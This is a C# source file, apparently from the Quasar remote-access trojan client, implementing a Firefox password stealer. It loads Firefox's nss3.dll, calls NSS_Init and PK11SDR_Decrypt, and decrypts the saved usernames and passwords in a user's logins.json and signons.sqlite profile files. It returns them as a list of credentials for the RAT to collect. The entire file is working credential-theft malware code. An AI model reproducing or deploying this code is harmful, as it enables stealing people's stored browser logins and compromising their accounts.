using Quasar.Client.Helper;
using Quasar.Client.Kematian.Browsers.Helpers.SQL;
using Quasar.Client.Kematian.Browsers.Helpers.Structs;
using Quasar.Client.Utilities;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Text;

namespace Quasar.Client.Kematian.Browsers.Gecko.Passwords
{
    public class PasswordsGecko : IDisposable
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem
        {
            public int SECItemType;
            public IntPtr SECItemData;
            public int SECItemLen;
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssInit(string configDirectory);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssShutdown();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int Pk11sdrDecrypt(ref TSECItem data, ref TSECItem result, int cx);

        private NssInit NSS_Init;

        private NssShutdown NSS_Shutdown;

        private Pk11sdrDecrypt PK11SDR_Decrypt;

        private IntPtr NSS3;
        private IntPtr Mozglue;

        public long Init(string configDirectory)
        {
            string mozillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\");

            if (!Directory.Exists(mozillaPath))
            {
                Debug.WriteLine("Mozilla Firefox not found.");
                return -1;
            }

            string nssPath = Path.Combine(mozillaPath, "nss3.dll");
            Mozglue = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
            NSS3 = NativeMethods.LoadLibrary(nssPath);

            if (NSS3 == IntPtr.Zero)
            {
                Debug.WriteLine("Failed to load nss3.dll");
                return -1;
            }

            IntPtr initProc = NativeMethods.GetProcAddress(NSS3, "NSS_Init");
            IntPtr shutdownProc = NativeMethods.GetProcAddress(NSS3, "NSS_Shutdown");
            IntPtr decryptProc = NativeMethods.GetProcAddress(NSS3, "PK11SDR_Decrypt");

            if (initProc == IntPtr.Zero || shutdownProc == IntPtr.Zero || decryptProc == IntPtr.Zero)
            {
                Debug.WriteLine("Failed to get required function pointers from NSS3.");
                return -1;
            }

            NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(initProc, typeof(NssInit));
            PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(decryptProc, typeof(Pk11sdrDecrypt));
            NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(shutdownProc, typeof(NssShutdown));

            return NSS_Init(configDirectory);
        }

        public string Decrypt(string cypherText)
        {
            if (string.IsNullOrEmpty(cypherText))
                return string.Empty;

            IntPtr ffDataUnmanagedPointer = IntPtr.Zero;

            try
            {
                byte[] ffData = Convert.FromBase64String(cypherText);

                ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length);
                Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length);

                TSECItem tSecDec = new TSECItem();
                TSECItem item = new TSECItem
                {
                    SECItemType = 0,
                    SECItemData = ffDataUnmanagedPointer,
                    SECItemLen = ffData.Length
                };

                if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                {
                    if (tSecDec.SECItemLen != 0)
                    {
                        byte[] bvRet = new byte[tSecDec.SECItemLen];
                        Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
                        return Encoding.UTF8.GetString(bvRet);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Decryption error: {ex.Message}");
                return null;
            }
            finally
            {
                if (ffDataUnmanagedPointer != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(ffDataUnmanagedPointer);
                }
            }

            return null;
        }

        public IEnumerable<string> SafeEnumerateDirectories(string path)
        {
            var directories = new List<string>();
            try
            {
                foreach (var dir in Directory.EnumerateDirectories(path))
                {
                    directories.Add(dir);

                    // Recursively enumerate subdirectories
                    try
                    {
                        directories.AddRange(SafeEnumerateDirectories(dir));
                    }
                    catch (UnauthorizedAccessException)
                    {
                        //Debug.WriteLine("Unauthorized access to directory: " + dir);
                    }
                    catch (PathTooLongException)
                    {
                        // Skip directories with paths that are too long
                    }
                }
            }
            catch (UnauthorizedAccessException)
            {
                //Debug.WriteLine(path);
            }
            catch (PathTooLongException)
            {
                // Skip root-level directories with paths that are too long
            }
            return directories;
        }

        public List<LoginData> GetLogins(string profilePath, string loginJsonPath = "", string signonsDBPath = "")
        {
            var logins = new List<LoginData>();
            Debug.WriteLine($"Profile path: {profilePath}");
            Debug.WriteLine($"Logins.json path: {loginJsonPath}");
            Debug.WriteLine($"Signons.sqlite path: {signonsDBPath}");

            // Check if at least one file exists
            bool loginsJsonExists = !string.IsNullOrEmpty(loginJsonPath) && File.Exists(loginJsonPath);
            bool signonsExists = !string.IsNullOrEmpty(signonsDBPath) && File.Exists(signonsDBPath);

            if (!loginsJsonExists && !signonsExists)
            {
                Debug.WriteLine("No login files found.");
                return logins;
            }

            // Initialize NSS only once
            if (Init(profilePath) != 0)
            {
                Debug.WriteLine("Failed to initialize NSS.");
                return logins;
            }

            // Process logins.json if it exists
            if (loginsJsonExists)
            {
                try
                {
                    FFLogins ffLoginData;
                    using (var sr = File.OpenRead(loginJsonPath))
                    {
                        ffLoginData = JsonHelper.Deserialize<FFLogins>(sr);
                    }

                    foreach (Login loginData in ffLoginData.Logins)
                    {
                        try
                        {
                            string username = Decrypt(loginData.EncryptedUsername);
                            string password = Decrypt(loginData.EncryptedPassword);
                            string url = loginData.Hostname?.ToString() ?? string.Empty;

                            if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(username))
                            {
                                logins.Add(new LoginData(url, username, password));
                            }
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error processing login entry: {ex.Message}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error processing logins.json: {ex.Message}");
                }
            }

            // Process signons.sqlite if it exists
            if (signonsExists)
            {
                try
                {
                    SQLiteHandler sqlDatabase = new SQLiteHandler(signonsDBPath);

                    if (sqlDatabase.ReadTable("moz_logins"))
                    {
                        for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                        {
                            try
                            {
                                string host = sqlDatabase.GetValue(i, "hostname");
                                string encryptedUser = sqlDatabase.GetValue(i, "encryptedUsername");
                                string encryptedPass = sqlDatabase.GetValue(i, "encryptedPassword");

                                string username = Decrypt(encryptedUser);
                                string password = Decrypt(encryptedPass);

                                if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(username))
                                {
                                    logins.Add(new LoginData(host, username, password));
                                }
                            }
                            catch (Exception ex)
                            {
                                Debug.WriteLine($"Error processing signons entry: {ex.Message}");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error processing signons.sqlite: {ex.Message}");
                }
            }

            return logins;
        }

        [DataContract]
        private class FFLogins
        {
            [DataMember(Name = "nextId")]
            public long NextId { get; set; }

            [DataMember(Name = "logins")]
            public Login[] Logins { get; set; }

            [IgnoreDataMember]
            [DataMember(Name = "potentiallyVulnerablePasswords")]
            public object[] PotentiallyVulnerablePasswords { get; set; }

            [IgnoreDataMember]
            [DataMember(Name = "dismissedBreachAlertsByLoginGUID")]
            public DismissedBreachAlertsByLoginGuid DismissedBreachAlertsByLoginGuid { get; set; }

            [DataMember(Name = "version")]
            public long Version { get; set; }
        }

        [DataContract]
        private class DismissedBreachAlertsByLoginGuid
        {
        }

        [DataContract]
        private class Login
        {
            [DataMember(Name = "id")]
            public long Id { get; set; }

            [DataMember(Name = "hostname")]
            public Uri Hostname { get; set; }

            [DataMember(Name = "httpRealm")]
            public object HttpRealm { get; set; }

            [DataMember(Name = "formSubmitURL")]
            public Uri FormSubmitUrl { get; set; }

            [DataMember(Name = "usernameField")]
            public string UsernameField { get; set; }

            [DataMember(Name = "passwordField")]
            public string PasswordField { get; set; }

            [DataMember(Name = "encryptedUsername")]
            public string EncryptedUsername { get; set; }

            [DataMember(Name = "encryptedPassword")]
            public string EncryptedPassword { get; set; }

            [DataMember(Name = "guid")]
            public string Guid { get; set; }

            [DataMember(Name = "encType")]
            public long EncType { get; set; }

            [DataMember(Name = "timeCreated")]
            public long TimeCreated { get; set; }

            [DataMember(Name = "timeLastUsed")]
            public long TimeLastUsed { get; set; }

            [DataMember(Name = "timePasswordChanged")]
            public long TimePasswordChanged { get; set; }

            [DataMember(Name = "timesUsed")]
            public long TimesUsed { get; set; }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                try
                {
                    if (NSS_Shutdown != null)
                        NSS_Shutdown();

                    if (NSS3 != IntPtr.Zero)
                        NativeMethods.FreeLibrary(NSS3);

                    if (Mozglue != IntPtr.Zero)
                        NativeMethods.FreeLibrary(Mozglue);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error during disposal: {ex.Message}");
                }
            }
        }
    }
}
